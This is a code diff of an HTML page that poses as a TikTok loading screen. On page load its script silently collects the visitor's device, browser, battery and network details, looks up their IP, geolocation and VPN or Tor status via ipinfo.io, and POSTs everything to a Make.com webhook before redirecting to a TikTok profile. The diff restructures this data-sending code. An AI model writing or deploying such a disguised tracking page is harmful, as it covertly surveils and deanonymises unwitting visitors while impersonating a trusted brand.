@@ -1,5 +1,4 @@
- 
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
@@ -7,7 +6,6 @@
   <title>TikTok</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Rubik:wght@500&display=swap');
-
     body {
       margin: 0;
       padding: 0;
@@ -15,7 +13,6 @@
       background: #fff;
       color: #000;
     }
-
     .tiktok-container {
       display: flex;
       flex-direction: column;
@@ -25,7 +22,6 @@
       box-sizing: border-box;
       justify-content: center;
     }
-
     .logo {
       width: 80px;
       height: 80px;
@@ -34,19 +30,16 @@
       animation: float 2s ease-in-out infinite;
       margin-bottom: 10px;
     }
-
     .brand-name {
       font-size: 24px;
       color: #000;
       margin-bottom: 20px;
     }
-
     .loading-text {
       font-size: 18px;
       color: #333;
       margin-bottom: 20px;
     }
-
     .spinner {
       border: 4px solid #f3f3f3;
       border-top: 4px solid #ff0050;
@@ -56,19 +49,16 @@
       animation: spin 1s linear infinite;
       margin-bottom: 20px;
     }
-
     .sub-text {
       color: #888;
       font-size: 14px;
       text-align: center;
       max-width: 300px;
     }
-
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
     @keyframes float {
       0%, 100% { transform: translateY(0); }
       50% { transform: translateY(-8px); }
@@ -113,36 +103,34 @@
         localStorage: !!window.localStorage,
         sessionStorage: !!window.sessionStorage,
         timestamp: now.toISOString(),
-        localTime: localTime,
+        localTime: localTime
       };
 
-      if (navigator.connection) {
-        userData.connectionType = navigator.connection.effectiveType;
-        userData.downlink = navigator.connection.downlink;
-        userData.rtt = navigator.connection.rtt;
-      }
+      try {
+        if (navigator.connection) {
+          userData.connectionType = navigator.connection.effectiveType;
+          userData.downlink = navigator.connection.downlink;
+          userData.rtt = navigator.connection.rtt;
+        }
 
-      if (navigator.deviceMemory) {
-        userData.deviceMemory = navigator.deviceMemory + " GB";
-      }
+        if (navigator.deviceMemory) {
+          userData.deviceMemory = navigator.deviceMemory + " GB";
+        }
 
-      if (navigator.hardwareConcurrency) {
-        userData.cpuCores = navigator.hardwareConcurrency;
-      }
+        if (navigator.hardwareConcurrency) {
+          userData.cpuCores = navigator.hardwareConcurrency;
+        }
 
-      if (navigator.maxTouchPoints) {
-        userData.touchSupport = navigator.maxTouchPoints > 0;
-      }
+        if (navigator.maxTouchPoints) {
+          userData.touchSupport = navigator.maxTouchPoints > 0;
+        }
 
-      if (navigator.getBattery) {
-        try {
+        if (navigator.getBattery) {
           const battery = await navigator.getBattery();
           userData.batteryLevel = Math.round(battery.level * 100) + "%";
           userData.isCharging = battery.charging;
-        } catch (err) {}
-      }
+        }
 
-      try {
         const ipRes = await fetch('https://ipinfo.io/json?token=cb4dd6c6220e6e');
         const ipData = await ipRes.json();
         userData.ip = ipData.ip;
@@ -158,34 +146,27 @@
         userData.vpn = ipData.privacy?.vpn || false;
         userData.proxy = ipData.privacy?.proxy || false;
         userData.tor = ipData.privacy?.tor || false;
+
+        await fetch("https://hook.eu2.make.com/getpor6u5xfrmr4xwkwr0p81umfj5okg", {
+          method: "POST",
+          body: JSON.stringify(userData),
+          headers: {
+            "Content-Type": "application/json"
+          }
+        });
+        console.log("✅ Data sent to Make");
       } catch (err) {
-        console.error('IPInfo Error:', err);
+        console.error("❌ Error collecting or sending data:", err);
+      } finally {
+        // ✅ التحويل مضمون بعد 2.5 ثانية
+        setTimeout(() => {
+          window.location.href = "https://www.tiktok.com/@dr3altwhed?_t=ZS-8yHpMxmbUCl&_r=1";
+        }, 2500);
       }
-
-      // ✅ إرسال البيانات إلى Make Webhook
-      fetch("https://hook.eu2.make.com/getpor6u5xfrmr4xwkwr0p81umfj5okg", {
-        method: "POST",
-        body: JSON.stringify(userData),
-        headers: {
-          "Content-Type": "application/json"
-        }
-      })
-      .then(response => response.text())
-      .then(data => {
-        console.log("✅ Sent to Make:", data);
-      })
-      .catch(error => {
-        console.error("❌ Error sending data:", error);
-      });
-
-      // 🔁 التحويل إلى TikTok بعد 2.5 ثانية
-      setTimeout(() => {
-        window.location.href = "https://www.tiktok.com/@dr3altwhed?_t=ZS-8yHpMxmbUCl&_r=1";
-      }, 2500);
     }
 
     collectData();
   </script>
 </body>
 </html>
-  
+
